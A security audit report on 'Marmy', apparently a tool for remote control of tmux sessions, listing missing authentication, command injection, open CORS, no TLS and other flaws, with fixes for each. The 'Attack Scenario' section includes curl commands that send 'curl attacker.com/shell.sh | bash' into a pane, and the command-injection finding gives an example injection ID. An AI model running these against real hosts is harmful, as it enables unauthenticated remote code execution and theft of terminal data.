# Marmy Security Assessment

## Executive Summary

Marmy has **critical security vulnerabilities** that make it **unsafe for production deployment**. The most severe issues are the complete absence of authentication on REST API endpoints (the auth middleware exists but is never applied to routes) and command injection vectors via unsanitized tmux IDs. An attacker on the same network could gain full control of tmux sessions — executing arbitrary commands on the host machine — with zero authentication.

---

## Critical Findings (5)

### 1. Authentication Middleware Never Applied to Routes
**`agent/src/api/mod.rs:23-30`** | CRITICAL

The `auth_middleware` is defined in `auth.rs` but is **never wired into the router**. All REST endpoints are publicly accessible:

```rust
let api_routes = Router::new()
    .route("/api/sessions", get(sessions::list_sessions))
    .route("/api/panes/:id/input", post(panes::send_input))
    // ... no .layer(middleware::from_fn(...)) applied
```

**Impact:** Anyone on the network can list sessions, read terminal output, send keystrokes, and browse files — no token required.

### 2. Command Injection via Unsanitized Pane/Session IDs
**`agent/src/tmux/control.rs:299,312,355,361`** | CRITICAL

Pane and session IDs are interpolated directly into tmux commands without quoting or validation:

```rust
let cmd = format!("send-keys -t {} -H {}", pane_id, hex);
```

The `normalize_pane_id()` in `panes.rs:119-125` only prepends `%` — it does not validate the format. A crafted ID like `%0; kill-session -t important` would inject arbitrary tmux commands.

### 3. Unrestricted CORS (Any Origin)
**`agent/src/api/mod.rs:14-17`** | CRITICAL

```rust
let cors = CorsLayer::new()
    .allow_origin(Any)
    .allow_methods(Any)
    .allow_headers(Any);
```

Any website can make cross-origin requests to the agent, enabling browser-based exfiltration of terminal data.

### 4. No TLS/HTTPS Support
**`agent/src/main.rs:126-127`** | CRITICAL

The agent only supports plaintext HTTP/WS. Auth tokens, terminal output, and commands are transmitted unencrypted. No `rustls` or TLS dependency exists.

### 5. WebView `originWhitelist={["*"]}`
**`mobile/src/components/TerminalView.tsx:165`** | CRITICAL

The terminal WebView allows all origins, breaking same-origin policy. Combined with CDN-loaded xterm libraries (no SRI hashes), this is an XSS/supply-chain attack vector.

---

## High Findings (7)

| # | Issue | Location | Description |
|---|-------|----------|-------------|
| 6 | **WebSocket has no auth** | `agent/src/api/ws.rs:18-23` | No token check — anyone can connect, subscribe to panes, and send input |
| 7 | **Default bind `0.0.0.0`** | `agent/src/config.rs:55-57` | Exposes the service to all network interfaces by default |
| 8 | **Token stored in world-readable file** | `agent/src/config.rs:136-145` | Config file created with default umask; no `chmod 0600` applied |
| 9 | **Path traversal via symlink race** | `agent/src/api/files.rs:136-149` | TOCTOU between `canonicalize()` check and `read_to_string()` allows symlink swap |
| 10 | **No rate limiting** | All API endpoints | No throttling — trivial DoS via request flooding |
| 11 | **Mobile defaults to HTTP** | `mobile/src/services/api.ts:15` | `http://` default means tokens sent in cleartext |
| 12 | **CDN libs without SRI** | `mobile/src/components/TerminalView.tsx:26,36-38` | xterm loaded from cdn.jsdelivr.net without integrity checks |

---

## Medium Findings (6)

| # | Issue | Location | Description |
|---|-------|----------|-------------|
| 13 | **Timing-unsafe token comparison** | `agent/src/auth.rs:22` | Uses `==` instead of constant-time comparison |
| 14 | **Non-CS token generation** | `agent/src/config.rs:155-160` | Uses `thread_rng()` (PCG) instead of `OsRng` |
| 15 | **No WebSocket message size limit** | `agent/src/api/ws.rs:116-153` | Arbitrarily large messages can exhaust memory |
| 16 | **Resize params unchecked** | `agent/src/api/panes.rs:64-78` | `cols`/`rows` not bounded; can crash tmux or DoS |
| 17 | **Error messages leak internals** | `agent/src/api/panes.rs`, `files.rs` | Raw error strings returned to clients |
| 18 | **No runtime WS message validation** | `mobile/src/services/websocket.ts:81-89` | TypeScript types are compile-time only; no runtime schema check |

---

## Low Findings (4)

| # | Issue | Location | Description |
|---|-------|----------|-------------|
| 19 | Large files loaded fully into memory | `agent/src/api/files.rs:104-107` | Up to 2MB per request, no streaming |
| 20 | Session IDs in logs | `agent/src/api/ws.rs:126` | Could leak topology to log readers |
| 21 | Silent catch blocks | `mobile/src/stores/connectionStore.ts:13,20` | Failures silently swallowed |
| 22 | No logout / token revocation | Mobile app | Tokens persist in SecureStore indefinitely |

---

## Positive Findings

- Credentials stored via `expo-secure-store` (iOS Keychain / Android Keystore)
- No hardcoded secrets in the codebase
- No debug logging or `console.log` in production code
- File browsing disabled by default with explicit allowlist
- File access is read-only (no write endpoints)
- 2MB file size cap prevents extremely large reads

---

## Attack Scenario: Full Compromise

An attacker on the same network (or any website via CORS) can:

```bash
# 1. Enumerate all tmux sessions (no auth)
curl http://target:9876/api/sessions

# 2. Read terminal output (passwords, secrets, code)
curl http://target:9876/api/panes/%0/content

# 3. Execute arbitrary commands in any pane
curl -X POST http://target:9876/api/panes/%0/input \
  -H "Content-Type: application/json" \
  -d '{"keys":"curl attacker.com/shell.sh | bash\n"}'
```

**Time to full RCE: ~3 seconds. Zero authentication required.**

---

## Remediation Priority

### Must fix before any deployment:
1. **Apply auth middleware** to all API routes (the code exists, just wire it in)
2. **Validate pane/session ID format** — regex `^[%$@]\d+$` and quote in tmux commands
3. **Add WebSocket authentication** (token in query param or first message)
4. **Restrict CORS** to specific origins or disable entirely
5. **Add TLS support** (rustls) or document that Tailscale/VPN is mandatory

### Should fix soon:
6. Change default bind to `127.0.0.1`
7. Set `chmod 0600` on config file
8. Use `OsRng` for token generation and constant-time comparison
9. Add rate limiting (tower middleware)
10. Fix WebView `originWhitelist` and bundle xterm locally with SRI

### Fix before v1:
11. Implement token rotation and expiration
12. Add WebSocket message size limits
13. Sanitize error messages returned to clients
14. Add runtime message validation in mobile app (zod or similar)
